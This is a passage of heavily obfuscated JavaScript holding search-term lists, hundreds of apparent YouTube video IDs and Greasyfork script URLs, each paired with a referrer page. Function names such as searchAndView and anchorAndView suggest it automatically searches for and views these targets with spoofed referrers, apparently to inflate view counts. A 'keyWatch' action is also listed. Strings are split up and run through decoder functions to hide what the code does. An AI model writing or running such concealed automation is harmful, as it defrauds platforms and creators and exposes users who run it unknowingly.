'\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x16 * 0x46 + -0x150c + 0x1b1a)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x10f8 + -0xfd5 + 0x20d7)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1df0 + -0xa16 + -0x13d7 * 0x1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    W(0xc, '#dmC') + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    W(0x1b, 'ACGE') + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    X(0x15) + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + X(0x8) + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + Y(0x10)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': Y(0x17) + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + Y(0x18) + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + W(0x2, 'HE]7') + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + Y(0x16),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + W(0x12, 'Lkwn') + 's',
